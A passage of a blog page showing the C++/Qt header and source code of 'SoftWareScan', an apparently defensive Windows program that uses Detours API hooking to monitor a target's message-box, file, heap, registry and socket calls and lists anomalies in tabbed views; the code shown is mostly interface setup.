class="function"><span class="keyword">void</span> <span class="title">State_socket</span><span class="params">(<span class="keyword">int</span> state)</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">State_connect</span><span class="params">(<span class="keyword">int</span> state)</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">State_bind</span><span class="params">(<span class="keyword">int</span> state)</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">State_send</span><span class="params">(<span class="keyword">int</span> state)</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">State_recv</span><span class="params">(<span class="keyword">int</span> state)</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">State_copyfilea</span><span class="params">(<span class="keyword">int</span> state)</span></span>;</span><br><span class="line">	<span class="comment">//进度条函数</span></span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">ProgressBar</span><span class="params">(<span class="keyword">int</span> i)</span></span>;</span><br><span class="line">	<span class="comment">//异常记录函数</span></span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">NewHeapInfo</span><span class="params">(QString string)</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">NewRegInfo</span><span class="params">(<span class="keyword">int</span> handle, QString string)</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">NewFileInfo</span><span class="params">(<span class="keyword">int</span> handle, QString string)</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">NewSocketInfo</span><span class="params">(QString string)</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">NewHeapBlock</span><span class="params">()</span></span>;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	Ui::SoftWareScanClass ui;</span><br><span class="line">	<span class="comment">//MyThread threadA;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mtext>  </mtext><mi>S</mi><mi>o</mi><mi>f</mi><mi>t</mi><mi>W</mi><mi>a</mi><mi>r</mi><mi>e</mi><mi>S</mi><mi>c</mi><mi>a</mi><mi>n</mi><mi mathvariant="normal">.</mi><mi>c</mi><mi>p</mi><mi>p</mi><mtext>  </mtext></mrow><annotation encoding="application/x-tex">\;SoftWareScan.cpp\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.13889em;">W</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault">c</span><span class="mord mathdefault">a</span><span class="mord mathdefault">n</span><span class="mord">.</span><span class="mord mathdefault">c</span><span class="mord mathdefault">p</span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>:</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;SoftWareScan.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;ui_SoftWareScan.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;QFileDialog&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;QtWidgets/QApplication&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;detours.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;QMessageBox&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;qlistwidget.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;qcheckbox.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;qdatetime.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;qtablewidget.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;qlayout.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="meta-string">&quot;detours.lib&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> <span class="meta-keyword">warning</span>(disable:4996)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">info recvinfo;</span><br><span class="line">QListWidget* MessageList = <span class="literal">nullptr</span>;</span><br><span class="line">QListWidget* FileList = <span class="literal">nullptr</span>;</span><br><span class="line">QListWidget* HeapList = <span class="literal">nullptr</span>;</span><br><span class="line">QListWidget* RegList = <span class="literal">nullptr</span>; </span><br><span class="line">QListWidget* SocketList = <span class="literal">nullptr</span>;</span><br><span class="line">QListWidget* HeapException;</span><br><span class="line">QListWidget* FileException;</span><br><span class="line">QListWidget* RegException;</span><br><span class="line">QListWidget* SocketException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> typestr[<span class="number">25</span>][<span class="number">20</span>] = &#123; <span class="string">&quot;None&quot;</span>,<span class="string">&quot;MessageBoxA&quot;</span>,<span class="string">&quot;MessageBoxW&quot;</span>,<span class="string">&quot;CreateFile&quot;</span>,<span class="string">&quot;WriteFile&quot;</span>,<span class="string">&quot;ReadFile&quot;</span>,<span class="string">&quot;CloseHandle&quot;</span>,<span class="string">&quot;HeapCreate&quot;</span>,<span class="string">&quot;HeapDestroy&quot;</span>, <span class="string">&quot;HeapFree&quot;</span>,<span class="string">&quot;HeapAlloc&quot;</span>, <span class="string">&quot;RegCreateKeyEx&quot;</span>, <span class="string">&quot;RegSetValueEx&quot;</span>,<span class="string">&quot;RegCloseKey&quot;</span>, <span class="string">&quot;RegOpenKeyEx&quot;</span>, <span class="string">&quot;RegDeleteValue&quot;</span>, <span class="string">&quot;socket&quot;</span>,<span class="string">&quot;bind&quot;</span>, <span class="string">&quot;send&quot;</span>, <span class="string">&quot;connect&quot;</span>, <span class="string">&quot;recv&quot;</span>,<span class="string">&quot;CopyFileA&quot;</span> &#125;;</span><br><span class="line"></span><br><span class="line">SoftWareScan::<span class="built_in">SoftWareScan</span>(QWidget *parent)</span><br><span class="line">	: <span class="built_in">QWidget</span>(parent)</span><br><span class="line">&#123;</span><br><span class="line">	ui.<span class="built_in">setupUi</span>(<span class="keyword">this</span>);  </span><br><span class="line">	<span class="built_in">InitUI</span>();</span><br><span class="line">	qRegisterMetaType&lt;info&gt;(<span class="string">&quot;info&quot;</span>);<span class="comment">//构造函数中初始化注册自定义类型</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SoftWareScan::InitUI</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//文件信息窗口</span></span><br><span class="line">	<span class="built_in">FileInfoWindow</span>();</span><br><span class="line">	<span class="comment">//API信息窗口</span></span><br><span class="line">	<span class="built_in">APIInfoWindow</span>(); </span><br><span class="line">	<span class="comment">//进程信息窗口</span></span><br><span class="line">	<span class="built_in">ProcessInfoTable</span>();</span><br><span class="line">	<span class="built_in">InitCheck</span>();</span><br><span class="line">	<span class="built_in">InitExceptionTab</span>();</span><br><span class="line">	<span class="built_in">InitJieHuo</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">connect</span>(&amp;threadA, <span class="built_in">SIGNAL</span>(<span class="built_in">newInfo</span>(info)), <span class="keyword">this</span>, <span class="built_in">SLOT</span>(<span class="built_in">on_threadA_newInfo</span>(info)));</span><br><span class="line">	<span class="built_in">connect</span>(&amp;threadA, <span class="built_in">SIGNAL</span>(<span class="built_in">newStatus</span>()), <span class="keyword">this</span>, <span class="built_in">SLOT</span>(<span class="built_in">on_threadA_newStatus</span>()));</span><br><span class="line">	<span class="comment">//connect(&amp;threadA, SIGNAL(newProcessInfo(PROCESS_INFORMATION)), this, SLOT(on_threadA_newProcessInfo(PROCESS_INFORMATION)));</span></span><br><span class="line">	<span class="comment">//connect(this, SIGNAL(BN_CLICKED), this, SLOT(on_Fileopen_pressed));</span></span><br><span class="line">	<span class="built_in">connect</span>(&amp;threadA, <span class="built_in">SIGNAL</span>(<span class="built_in">newProcessName</span>(QString)), <span class="keyword">this</span>, <span class="built_in">SLOT</span>(<span class="built_in">on_threadA_newProcessName</span>(QString)));</span><br><span class="line">	<span class="built_in">connect</span>(&amp;threadA, <span class="built_in">SIGNAL</span>(<span class="built_in">newProcessID</span>(<span class="keyword">int</span>)), <span class="keyword">this</span>, <span class="built_in">SLOT</span>(<span class="built_in">on_threadA_newProcessID</span>(<span class="keyword">int</span>)));</span><br><span class="line">	<span class="built_in">connect</span>(&amp;threadA, <span class="built_in">SIGNAL</span>(<span class="built_in">newProcessHandle</span>(QString)), <span class="keyword">this</span>, <span class="built_in">SLOT</span>(<span class="built_in">on_threadA_newProcessHandle</span>(QString)));</span><br><span class="line">	<span class="built_in">connect</span>(&amp;threadA, <span class="built_in">SIGNAL</span>(<span class="built_in">newHeapInfo</span>(QString)), <span class="keyword">this</span>, <span class="built_in">SLOT</span>(<span class="built_in">NewHeapInfo</span>(QString)));</span><br><span class="line">	<span class="built_in">connect</span>(&amp;threadA, <span class="built_in">SIGNAL</span>(<span class="built_in">newRegInfo</span>(<span class="keyword">int</span>, QString)), <span class="keyword">this</span>, <span class="built_in">SLOT</span>(<span class="built_in">NewRegInfo</span>(<span class="keyword">int</span>, QString)));</span><br><span class="line">	<span class="built_in">connect</span>(&amp;threadA, <span class="built_in">SIGNAL</span>(<span class="built_in">newFileInfo</span>(<span class="keyword">int</span>, QString)), <span class="keyword">this</span>, <span class="built_in">SLOT</span>(<span class="built_in">NewFileInfo</span>(<span class="keyword">int</span>, QString)));</span><br><span class="line">	<span class="built_in">connect</span>(&amp;threadA, <span class="built_in">SIGNAL</span>(<span class="built_in">newSocketInfo</span>(QString)), <span class="keyword">this</span>, <span class="built_in">SLOT</span>(<span class="built_in">NewSocketInfo</span>(QString)));</span><br><span class="line">	<span class="built_in">connect</span>(&amp;threadA, <span class="built_in">SIGNAL</span>(<span class="built_in">newHeapBlock</span>()), <span class="keyword">this</span>, <span class="built_in">SLOT</span>(<span class="built_in">NewHeapBlock</span>()));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SoftWareScan::InitJieHuo</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//添加Tab</span></span><br><span class="line">	ui.JieHuo-&gt;<span class="built_in">addTab</span>(ui.message,<span class="built_in">QIcon</span>(<span class="string">&quot;./Resources/api_message.png&quot;</span>), QString::<span class="built_in">fromLocal8Bit</span>(<span class="string">&quot;弹窗API截获&quot;</span>));</span><br><span class="line">	ui.JieHuo-&gt;<span class="built_in">addTab</span>(ui.file, <span class="built_in">QIcon</span>(<span class="string">&quot;./Resources/api_file.png&quot;</span>), QString::<span class="built_in">fromLocal8Bit</span>(<span class="string">&quot;文件API截获&quot;</span>));</span><br><span class="line">	ui.JieHuo-&gt;<span class="built_in">addTab</span>(ui.heap, <span class="built_in">QIcon</span>(<span class="string">&quot;./Resources/api_heap.png&quot;</span>), QString::<span class="built_in">fromLocal8Bit</span>(<span class="string">&quot;堆操作API截获&quot;</span>));</span><br><span class="line">	ui.JieHuo-&gt;<span class="built_in">addTab</span>(ui.reg, <span class="built_in">QIcon</span>(<span class="string">&quot;./Resources/api_reg.png&quot;</span>), QString::<span class="built_in">fromLocal8Bit</span>(<span class="string">&quot;注册表API截获&quot;</span>));</span><br><span class="line">	ui.JieHuo-&gt;<span class="built_in">addTab</span>(ui.socket, <span class="built_in">QIcon</span>(<span class="string">&quot;./Resources/api_socket.png&quot;</span>), QString::<span class="built_in">fromLocal8Bit</span>(<span class="string">&quot;网络通信API截获&quot;</span>));</span><br><span class="line">	ui.JieHuo-&gt;<span class="built_in">setTabShape</span>(QTabWidget::Triangular);</span><br><span class="line">	<span class="comment">//弹窗标签页</span></span><br><span class="line">	QHBoxLayout* layout_h_message = <span class="keyword">new</span> <span class="built_in">QHBoxLayout</span>();</span><br><span class="line">	layout_h_message-&gt;<span class="built_in">addWidget</span>(ui.progress_message,<span class="number">0</span>,Qt::AlignCenter|Qt::AlignVCenter);</span><br><span class="line">	layout_h_message-&gt;<span class="built_in">addWidget</span>(ui.MessageCheckBox,<span class="number">0</span>,Qt::AlignCenter|Qt::AlignVCenter);</span><br><span class="line">	QHBoxLayout* layout_v_message = <span class="keyword">new</span> <span class="built_in">QHBoxLayout</span>();</span><br><span class="line">	layout_v_message-&gt;<span class="built_in">addWidget</span>(ui.MessageBoxInfo);</span><br><span class="line">	layout_v_message-&gt;<span class="built_in">setContentsMargins</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">	QVBoxLayout* layout_message = <span class="keyword">new</span> <span class="built_in">QVBoxLayout</span>();</span><br><span class="line">	layout_message-&gt;<span class="built_in">addLayout</span>(layout_h_message);</span><br><span class="line">	layout_message-&gt;<span class="built_in">addLayout</span>(layout_v_message);</span><br><span class="line">	ui.message-&gt;<span class="built_in">setLayout</span>(layout_message);</span><br><span class="line">	<span class="comment">//文件标签页</span></span><br><span class="line">	QHBoxLayout* layout_h_file = <span class="keyword">new</span> <span class="built_in">QHBoxLayout</span>();</span><br><span class="line">	layout_h_file-&gt;<span class="built_in">addWidget</span>(ui.progress_file, <span class="number">0</span>, Qt::AlignCenter | Qt::AlignVCenter);</span><br><span class="line">	layout_h_file-&gt;<span class="built_in">addWidget</span>(ui.FileCheckBox, <span class="number">0</span>, Qt::AlignCenter | Qt::AlignVCenter);</span><br><span class="line">	QHBoxLayout* layout_v_file = <span class="keyword">new</span> <span class="built_in">QHBoxLayout</span>();</span><br><span class="line">	layout_v_file-&gt;<span class="built_in">addWidget</span>(ui.FileApiInfo);</span><br><span class="line">	layout_v_file-&gt;<span class="built_in">setContentsMargins</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">	QVBoxLayout* layout_file = <span class="keyword">new</span> <span class="built_in">QVBoxLayout</span>();</span><br><span class="line">	layout_file-&gt;<span class="built_in">addLayout</span>(layout_h_file);</span><br><span class="line">	layout_file-&gt;<span class="built_in">addLayout</span>(layout_v_file);</span><br><span class="line">	ui.file-&gt;<span class="built_in">setLayout</span>(layout_file);</span><br><span class="line">	<span class="comment">//堆操作标签页</span></span><br><span class="line">	QHBoxLayout* layout_h_heap = <span class="keyword">new</span> <span class="built_in">QHBoxLayout</span>();</span><br><span class="line">	layout_h_heap-&gt;<span class="built_in">addWidget</span>(ui.progress_heap, <span class="number">0</span>, Qt::AlignCenter | Qt::AlignVCenter);</span><br><span class="line">	layout_h_heap-&gt;<span class="built_in">addWidget</span>(ui.HeapCheckBox, <span class="number">0</span>, Qt::AlignCenter | Qt::AlignVCenter);</span><br><span class="line">	QHBoxLayout* layout_v_heap = <span class="keyword">new</span> <span class="built_in">QHBoxLayout</span>();</span><br><span class="line">	layout_v_heap-&gt;<span class="built_in">addWidget</span>(ui.HeapApiInfo);</span><br><span class="line">	layout_v_heap-&gt;<span class="built_in">setContentsMargins</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">	QVBoxLayout* layout_heap = <span class="keyword">new</span> <span class="built_in">QVBoxLayout</span>();</span><br><span class="line">	layout_heap-&gt;<span class="built_in">addLayout</span>(layout_h_heap);</span><br><span class="line">	layout_heap-&gt;<span class="built_in">addLayout</span>(layout_v_heap); </span><br><span class="line">	ui.heap-&gt;<span class="built_in">setLayout</span>(layout_heap);</span><br><span class="line">	<span class="comment">//注册表标签页</span></span><br><span class="line">	QHBoxLayout* layout_h_reg = <span class="keyword">new</span> <span class="built_in">QHBoxLayout</span>();</span><br><span class="line">	layout_h_reg-&gt;<span class="built_in">addWidget</span>(ui.progress_reg, <span class="number">0</span>, Qt::AlignCenter | Qt::AlignVCenter);</span><br><span class="line">	layout_h_reg-&gt;<span class="built_in">addWidget</span>(ui.RegCheckBox, <span class="number">0</span>, Qt::AlignCenter | Qt::AlignVCenter);</span><br><span class="line">	QHBoxLayout* layout_v_reg = <span class="keyword">new</span> <span class="built_in">QHBoxLayout</span>();</span><br><span class="line">	layout_v_reg-&gt;<span class="built_in">addWidget</span>(ui.RegApiInfo);</span><br><span class="line">	layout_v_reg-&gt;<span class="built_in">setContentsMargins</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">	QVBoxLayout* layout_reg = <span class="keyword">new</span> <span class="built_in">QVBoxLayout</span>();</span><br><span class="line">	layout_reg-&gt;<span class="built_in">addLayout</span>(layout_h_reg);</span><br><span class="line">	layout_reg-&gt;<span class="built_in">addLayout</span>(layout_v_reg);</span><br><span class="line">	ui.reg-&gt;<span class="built_in">setLayout</span>(layout_reg);</span><br><span class="line">	<span class="comment">//网络通信标签页</span></span><br><span class="line">	QHBoxLayout* layout_h_socket = <span class="keyword">new</span> <span class="built_in">QHBoxLayout</span>();</span><br><span class="line">	layout_h_socket-&gt;<span class="built_in">addWidget</span>(ui.progress_socket, <span class="number">0</span>, Qt::AlignCenter | Qt::AlignVCenter);</span><br><span class="line">	layout_h_socket-&gt;<span class="built_in">addWidget</span>(ui.SocketCheckBox, <span class="number">0</span>, Qt::AlignCenter | Qt::AlignVCenter);</span><br><span class="line">	QHBoxLayout* layout_v_socket = <span class="keyword">new</span> <span class="built_in">QHBoxLayout</span>();</span><br><span class="line">	layout_v_socket-&gt;<span class="built_in">addWidget</span>(ui.SocketApiInfo);</span><br><span class="line">	layout_v_socket-&gt;<span class="built_in">setContentsMargins</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">	QVBoxLayout* layout_socket = <span class="keyword">new</span> <span class="built_in">QVBoxLayout</span>();</span><br><span class="line">	layout_socket-&gt;<span class="built_in">addLayout</span>(layout_h_socket);</span><br><span class="line">	layout_socket-&gt;<span class="built_in">addLayout</span>(layout_v_socket);</span><br><span class="line">	ui.socket-&gt;<span class="built_in">setLayout</span>(layout_socket);</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SoftWareScan::InitExceptionTab</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//样式？</span></span><br><span class="line">	ui.ApiInfo-&gt;<span class="built_in">setTabShape</span>(QTabWidget::Triangular);</span><br><span class="line">	<span class="comment">//添加Tab</span></span><br><span class="line">	ui.ApiInfo-&gt;<span class="built_in">addTab</span>(ui.Page_heap, <span class="built_in">QIcon</span>(<span class="string">&quot;./Resources/heap.png&quot;</span>), QString::<span class="built_in">fromLocal8Bit</span>(<span class="string">&quot;堆异常记录&quot;</span>));</span><br><span class="line">	ui.ApiInfo-&gt;<span class="built_in">addTab</span>(ui.Page_reg, <span class="built_in">QIcon</span>(<span class="string">&quot;./Resources/reg.png&quot;</span>), QString::<span class="built_in">fromLocal8Bit</span>(<span class="string">&quot;注册表异常记录&quot;</span>));</span><br><span class="line">	ui.ApiInfo-&gt;<span class="built_in">addTab</span>(ui.Page_file, <span class="built_in">QIcon</span>(<span class="string">&quot;./Resources/fileexception.png&quot;</span>), QString::<span class="built_in">fromLocal8Bit</span>(<span class="string">&quot;文件异常记录&quot;</span>));</span><br><span class="line">	ui.ApiInfo-&gt;<span class="built_in">addTab</span>(ui.Page_socket, <span class="built_in">QIcon</span>(<span class="string">&quot;./Resources/socket.png&quot;</span>), QString::<span class="built_in">fromLocal8Bit</span>(<span class="string">&quot;网络通信异常记录&quot;</span>));</span><br><span class="line">	<span class="comment">//堆异常标签页</span></span><br><span class="line">	QHBoxLayout* layout_heap = <span class="keyword">new</span> <span class="built_in">QHBoxLayout</span>();</span><br><span class="line">	HeapException= <span class="keyword">new</span> <span class="built_in">QListWidget</span>(ui.Page_heap);</span><br><span class="line">	HeapException-&gt;<span class="built_in">setObjectName</span>(QString::<span class="built_in">fromUtf8</span>(<span class="string">&quot;HeapException&quot;</span>));</span><br><span class="line">	layout_heap-&gt;<span class="built_in">addWidget</span>(HeapException);</span><br><span class="line">	layout_heap-&gt;<span class="built_in">setContentsMargins</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">	ui.Page_heap-&gt;<span class="built_in">setLayout</span>(layout_heap);</span><br><span class="line">	<span class="comment">//注册表异常标签页</span></span><br><span class="line">	QHBoxLayout* layout_reg = <span class="keyword">new</span> <span class="built_in">QHBoxLayout</span>();</span><br><span class="line">	RegException = <span class="keyword">new</span> <span class="built_in">QListWidget</span>(ui.Page_reg);</span><br><span class="line">	RegException-&gt;<span class="built_in">setObjectName</span>(QString::<span class="built_in">fromUtf8</span>(<span class="string">&quot;RegException&quot;</span>));</span><br><span class="line">	layout_reg-&gt;<span class="built_in">addWidget</span>(RegException);</span><br><span class="line">	layout_reg-&gt;<span class="built_in">setContentsMargins</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">	ui.Page_reg-&gt;<span class="built_in">setLayout</span>(layout_reg);</span><br><span class="line">	<span class="comment">//文件操作异常标签页</span></span><br><span class="line">	QHBoxLayout* layout_file = <span class="keyword">new</span> <span class="built_in">QHBoxLayout</span>();</span><br><span class="line">	FileException = <span class="keyword">new</span> <span class="built_in">QListWidget</span>(ui.Page_file);</span><br><span class="line">	FileException-&gt;<span class="built_in">setObjectName</span>(QString::<span class="built_in">fromLocal8Bit</span>(<span class="string">&quot;FileException&quot;</span>));</span><br><span class="line">	layout_file-&gt;<span class="built_in">addWidget</span>(FileException);</span><br><span class="line">	layout_file-&gt;<span class="built_in">setContentsMargins</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">	ui.Page_file-&gt;<span class="built_in">setLayout</span>(layout_file);</span><br><span class="line">	<span class="comment">//网络通信异常标签页</span></span><br><span class="line">	QHBoxLayout* layout_socket = <span class="keyword">new</span> <span class="built_in">QHBoxLayout</span>();</span><br><span class="line">	SocketException = <span class="keyword">new</span> <span class="built_in">QListWidget</span>(ui.Page_socket);</span><br><span class="line">	SocketException-&gt;<span class="built_in">setObjectName</span>(QString::<span class="built_in">fromLocal8Bit</span>(<span class="string">&quot;SocketException&quot;</span>));</span><br><span class="line">	layout_socket-&gt;<span class="built_in">addWidget</span>(SocketException);</span><br><span class="line">	layout_socket-&gt;<span class="built_in">setContentsMargins</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">	ui.Page_socket-&gt;<span class="built_in">setLayout</span>(layout_socket);</span><br><span class="line"></span><br><span class="line">	ui.HeapVerify-&gt;<span class="built_in">setTabShape</span>(QTabWidget::Triangular);</span><br><span class="line">	<span class="comment">//堆创建和销毁页</span></span><br><span class="line">	ui.HeapVerify-&gt;<span class="built_in">addTab</span>(ui.HeapCD, QString::<span class="built_in">fromLocal8Bit</span>(<span class="string">&quot;现存堆块&quot;</span>));</span><br><span class="line">	ui.HeapVerify-&gt;<span class="built_in">addTab</span>(ui.HeapMem, QString::<span class="built_in">fromLocal8Bit</span>(<span class="string">&quot;现存堆申请内存块&quot;</span>));</span><br><span class="line">	QHBoxLayout* layout_heapcd = <span class="keyword">new</span> <span class="built_in">QHBoxLayout</span>(ui.HeapCD);</span><br><span class="line">	layout_heapcd-&gt;<span class="built_in">addWidget</span>(ui.HeapCreateAndDestroy);</span><br><span class="line">	layout_heapcd-&gt;<span class="built_in">setContentsMargins</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">	ui.HeapCD-&gt;<span class="built_in">setLayout</span>(layout_heapcd);</span><br><span class="line">	QHBoxLayout* layout_heapmem = <span class="keyword">new</span> <span class="built_in">QHBoxLayout</span>(ui.HeapMem);</span><br><span class="line">	layout_heapmem-&gt;<span class="built_in">addWidget</span>(ui.HeapMemoryBlock);</span><br><span class="line">	layout_heapmem-&gt;<span class="built_in">setContentsMargins</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">	ui.HeapMem-&gt;<span class="built_in">setLayout</span>(layout_heapmem);</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SoftWareScan::InitCheck</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//对于弹窗信息选择</span></span><br><span class="line">	MessageList = <span class="keyword">new</span> <span class="built_in">QListWidget</span>();</span><br><span class="line">	MessageList-&gt;<span class="built_in">setObjectName</span>(<span class="built_in">QString</span>(<span class="string">&quot;listwidget_message&quot;</span>));</span><br><span class="line">	<span class="comment">//接下来定义两个checkbox</span></span><br><span class="line">	QListWidgetItem* item1 = <span class="keyword">new</span> <span class="built_in">QListWidgetItem</span>();</span><br><span class="line">	QListWidgetItem* item2 = <span class="keyword">new</span> <span class="built_in">QListWidgetItem</span>();</span><br><span class="line">	QCheckBox* Message_A = <span class="keyword">new</span> <span class="built_in">QCheckBox</span>();</span><br><span class="line">	QCheckBox* Message_B = <span class="keyword">new</span> <span class="built_in">QCheckBox</span>();</span><br><span class="line">	Message_A-&gt;<span class="built_in">setChecked</span>(<span class="literal">true</span>);</span><br><span class="line">	Message_B-&gt;<span class="built_in">setChecked</span>(<span class="literal">true</span>);</span><br><span class="line">	Message_A-&gt;<span class="built_in">setText</span>(<span class="string">&quot;MessageBoxA&quot;</span>);</span><br><span class="line">	Message_B-&gt;<span class="built_in">setText</span>(<span class="string">&quot;MessageBoxW&quot;</span>);</span><br><span class="line">	<span class="comment">//添加checkbox</span></span><br><span class="line">	MessageList-&gt;<span class="built_in">addItem</span>(item1);</span><br><span class="line">	MessageList-&gt;<span class="built_in">addItem</span>(item2);</span><br><span class="line">	MessageList-&gt;<span class="built_in">setItemWidget</span>(item1, Message_A);</span><br><span class="line">	MessageList-&gt;<span class="built_in">setItemWidget</span>(item2, Message_B);</span><br><span class="line">	<span class="built_in">connect</span>(Message_A, <span class="built_in">SIGNAL</span>(<span class="built_in">stateChanged</span>(<span class="keyword">int</span>)), <span class="keyword">this</span>, <span class="built_in">SLOT</span>(<span class="built_in">State_MessageA</span>(<span class="keyword">int</span>)));</span><br><span class="line">	<span class="built_in">connect</span>(Message_B, <span class="built_in">SIGNAL</span>(<span class="built_in">stateChanged</span>(<span class="keyword">int</span>)), <span class="keyword">this</span>, <span class="built_in">SLOT</span>(<span class="built_in">State_MessageB</span>(<span class="keyword">int</span>)));</span><br><span class="line">	ui.MessageCheckBox-&gt;<span class="built_in">setModel</span>(MessageList-&gt;<span class="built_in">model</span>());</span><br><span class="line">	ui.MessageCheckBox-&gt;<span class="built_in">setView</span>(MessageList);</span><br><span class="line">	<span class="comment">/*ui.Progress_message-&gt;setValue(100);*/</span></span><br><span class="line">	<span class="comment">//ui.MessageCheckBox-&gt;setCurrentIndex(0);</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//对于文件API过滤</span></span><br><span class="line">	FileList = <span class="keyword">new</span> <span class="built_in">QListWidget</span>();</span><br><span class="line">	FileList-&gt;<span class="built_in">setObjectName</span>(<span class="built_in">QString</span>(<span class="string">&quot;listwidget_file&quot;</span>));</span><br><span class="line">	<span class="comment">//五个checkbox</span></span><br><span class="line">	QListWidgetItem* item3 = <span class="keyword">new</span> <span class="built_in">QListWidgetItem</span>();</span><br><span class="line">	QListWidgetItem* item4 = <span class="keyword">new</span> <span class="built_in">QListWidgetItem</span>();</span><br><span class="line">	QListWidgetItem* item5 = <span class="keyword">new</span> <span class="built_in">QListWidgetItem</span>();</span><br><span class="line">	QListWidgetItem* item6 = <span class="keyword">new</span> <span class="built_in">QListWidgetItem</span>();</span><br><span class="line">	QListWidgetItem* item21 = <span class="keyword">new</span> <span class="built_in">QListWidgetItem</span>();</span><br><span class="line">	QCheckBox* File_create = <span class="keyword">new</span> <span class="built_in">QCheckBox</span>();</span><br><span class="line">	QCheckBox* File_write = <span class="keyword">new</span> <span class="built_in">QCheckBox</span>();</span><br><span class="line">	QCheckBox* File_read = <span class="keyword">new</span> <span class="built_in">QCheckBox</span>();</span><br><span class="line">	QCheckBox* File_close = <span class="keyword">new</span> <span class="built_in">QCheckBox</span>();</span><br><span class="line">	QCheckBox* File_copy = <span class="keyword">new</span> <span 